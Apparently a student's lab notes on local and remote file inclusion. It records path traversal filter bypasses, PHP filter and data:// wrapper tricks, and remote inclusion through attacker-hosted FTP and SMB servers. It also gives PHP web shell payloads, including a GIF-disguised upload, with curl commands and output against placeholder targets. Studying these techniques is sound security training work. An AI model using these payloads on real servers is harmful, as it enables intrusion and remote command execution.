# File Inclusion

## File Disclosure

### What I learned
- Path traversal filters can be bypassed with `....//` as server is configured to remove `../` by stripping it. By adding additional dots and slashes, after removing `../` from `....//` we are left with `../`, which is exactly what we want to go one directory back.
- URL encoding can bypass blacklists.
- Server can use several types of filtering to prevent LFI.
- Code disclosure is possible using base64 filters.
```url
php://filter/read=convert.base64-encode/resource=phpfilename
````

and then decode the base64 output to view potentially useful information.

- ffuf can be used not only for directory or subdomain fuzzing.
    

## What confused me

- Thought that non-recursive removal removes only the first specified string `../`, so it would be possible to bypass it with just `....//../../../etc/passwd`, but found out that it deletes **each** `../` in the text and not just once. Because of that `....//....//....//....//etc/passwd` is required to bypass non-recursive removal.
    
- Could not figure out why:
    
```bash
curl -s 'http://<TARGET>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat flag.txt'
```

does not work. Later found out that all spaces in the URL must be replaced with `%20`.

### What I'd do differently

- Test one bypass technique at a time instead of combining them randomly.
    
- Check PHP version and configuration before trying RCE methods.
    

## Remote Command Execution

### New Ideas

- You can start not only an HTTP server with python but also an FTP server in case of firewall restrictions or if `http://` string gets blocked.
    

```bash
sudo python -m pyftpdlib -p 21
```

- If server requires authentication the credentials can be specified as follows:
    

```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```

- SMB server can be used if server is hosted on a Windows machine. We can use impacket to do that:
    

```bash
impacket-smbserver -smb2support share $(pwd)
```

- Upload file path can often be found in the source code of the page.
    

### Bypasses / payloads


```bash
<?php system($_GET["cmd"]); ?>
```

```bash
GIF8<?php system($_GET["cmd"]); ?>
```

```bash
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

### Pitfalls

- Was confused because the RCE after file upload did not work:
    

```bash
http://<TARGET>/index.php?language=/profile_images/shell.gif&cmd=id
```

On further review found that `.` is required before `/profile_images`, so the full URL should be:

```bash
http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=id
```

- GIF8 string that is added confused me at first, as I thought it was part of the file name, but it is actually part of the file **content** used to bypass file type checks.
    

```bash
curl -s "http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=ls%20../../../../"
<!DOCTYPE html>
<...SNIP...>
           <h2>Containers</h2>
           GIF82f40d853e2d4768d87da1c81772bae0a.txt
bin
boot
dev
etc
home
<...SNIP...>
```
